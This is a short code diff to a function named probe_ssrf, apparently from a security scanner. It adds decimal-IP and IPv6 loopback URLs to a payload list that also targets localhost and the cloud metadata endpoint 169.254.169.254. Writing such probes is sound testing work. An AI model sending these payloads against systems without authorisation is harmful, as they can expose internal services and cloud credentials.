@@ -396,6 +396,8 @@ def probe_ssrf(ctx: Context, url: str, param: str) -> dict:
     payloads = [
         ("self-fetch", f"http://127.0.0.1:{port}/"),
         ("loopback-name", f"http://localhost:{port}/"),
+        ("decimal-ip", f"http://2130706433:{port}/"),
+        ("ipv6-loopback", f"http://[::1]:{port}/"),
         ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
     ]
     hits = []
